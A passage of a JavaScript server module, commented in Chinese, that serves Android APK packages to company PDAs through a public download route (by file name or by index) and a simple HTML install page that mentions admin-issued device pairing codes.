   * 为什么公开：PDA 上用浏览器直接输地址下载，让每台设备都先登录管理员不现实。
   * 分发包不含凭证，局域网内公开是可接受的；上传和删除仍然需要管理员。
   *
   * 注意：文件名可能含中文，经过某些隧道（如 Cloudflare）时 URL 编码会被改写，
   * 导致匹配失败。所以这里同时支持按「索引」下载：/download/0 表示最新一个包。
   * 列表接口会给出每个包的 index，PDA 用 index 访问最稳妥。
   */
  routes["GET /download/:name"] = (ctx) => {
    const raw = ctx.params.name;

    // 支持按索引取（0 = 最新），避开中文文件名在隧道里的编码问题
    let resolved = raw;
    if (/^\d+$/.test(raw)) {
      const list = listApks();
      const item = list[Number(raw)];
      if (!item) fail(404, "not_found", "安装包不存在");
      resolved = item.name;
    }

    const found = openApkStream(resolved);
    if (!found) fail(404, "not_found", "安装包不存在");

    // 下载名用 ASCII，避免浏览器处理中文名时出现乱码
    const asciiName = toAsciiName(resolved);
    return {
      stream: found.stream,
      headers: {
        "Content-Type": "application/vnd.android.package-archive",
        "Content-Length": found.size,
        "Content-Disposition": `attachment; filename="${asciiName}"`,
        "Cache-Control": "public, max-age=300",
      },
    };
  };

  /** 下载页：给 PDA 浏览器看的简单列表，扫码/点按即可下载。 */
  routes["GET /install"] = (ctx) => {
    const host = ctx.req.headers["host"] || "localhost";
    const scheme = ctx.req.headers["x-forwarded-proto"] || "http";
    const base = `${scheme}://${host}`;
    const apks = listApks();

    const items = apks.length
      ? apks
          .map(
            (f, i) => `
        <a class="item" href="/download/${i}">
          <span class="name">${escapeHtml(displayName(f.name))}</span>
          <span class="meta">${(f.size / 1048576).toFixed(1)} MB</span>
        </a>`,
          )
          .join("")
      : `<p class="empty">还没有上传安装包。请管理员在后台「安装包分发」里上传，或点「编译被监控端」直接构建。</p>`;

    const html = `<!DOCTYPE html>
<html lang="zh-CN"><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>安装 App</title>
<style>
  body{margin:0;background:#f5f6f8;font:16px/1.6 -apple-system,"PingFang SC","Microsoft YaHei",sans-serif;color:#1a1d21}
  .wrap{max-width:520px;margin:0 auto;padding:24px 18px}
  h1{font-size:20px;margin:0 0 6px}
  .sub{color:#6b7280;font-size:14px;margin:0 0 20px}
  .item{display:flex;justify-content:space-between;align-items:center;background:#fff;border:1px solid #e5e7eb;
        border-radius:12px;padding:16px;margin-bottom:10px;text-decoration:none;color:inherit}
  .item:active{background:#f3f4f6}
  .name{font-weight:600;word-break:break-all}
  .meta{color:#6b7280;font-size:13px;margin-left:12px;white-space:nowrap}
  .empty{color:#6b7280;font-size:14px}
  .tip{background:#eff6ff;border:1px solid #bfdbfe;border-radius:10px;padding:12px 14px;font-size:13.5px;color:#1e40af;margin-top:18px}
  .addr{font-family:ui-monospace,Menlo,monospace;background:#fff;border:1px solid #e5e7eb;border-radius:8px;
        padding:8px 10px;margin-top:8px;font-size:13px;word-break:break-all}
</style></head>
<body><div class="wrap">
  <h1>安装 App</h1>
  <p class="sub">点击下面的安装包下载到本机，然后在通知栏或文件管理器里打开安装。</p>
  ${items}
  <div class="tip">
    安装后还需要在 App 的「设备守护」页填写配对码。<br>
    配对码由管理员统一生成，每台设备一个，只能使用一次。
    <div class="addr">${escapeHtml(base)}</div>
  </div>
</div></body></html>`;

    return { raw: Buffer.from(html, "utf8"), contentType: "text/html; charset=utf-8" };
  };

  return routes;
}

function escapeHtml(s) {
  return String(s == null ? "" : s).replace(/[&<>"']/g, (c) =>
    ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" })[c],
  );
}

/** 推断服务端对外地址，用于预置进 APK。 */
/**
 * 把下载名转成纯 ASCII，避免浏览器对中文文件名的处理差异。 */function toAsciiName(name) {
  const ext = ".apk";
  const base = String(name || "app").replace(/\.apk$/i, "");
  // 只保留 ASCII 可打印字符
  const ascii = base.replace(/[^\x20-\x7e]/g, "").replace(/[\\/:*?"<>|]/g, "_").trim();
  return (ascii || "guardian") + ext;
}

/** 展示用的文件名：去掉时间戳里的冗余，保留可读部分。 */
function displayName(name) {
  return String(name || "");
}
